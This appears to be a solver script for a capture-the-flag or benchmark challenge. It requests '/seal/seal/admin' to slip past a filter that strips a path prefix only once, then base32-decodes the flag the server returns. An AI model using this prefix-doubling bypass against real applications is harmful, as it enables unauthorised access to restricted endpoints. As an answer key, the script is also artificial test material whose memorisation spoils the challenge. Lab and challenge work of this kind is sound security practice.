#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"

python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import base64, sys
from urllib.request import urlopen

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

# The filter uses replace("seal/", "", 1) — strips only the FIRST prefix.
# The resolver uses replace("seal/", "") — strips ALL prefixes.
# Doubling the prefix: seal/seal/admin passes the filter (one strip -> seal/admin)
# but the resolver strips all -> admin.
path = "/seal/seal/admin"
resp = urlopen(base + path, timeout=5)
body = resp.read()

# Body is base32-encoded text (Content-Type says octet-stream but it's ASCII)
flag = base64.b32decode(body).decode("utf-8")
print(flag)
PY
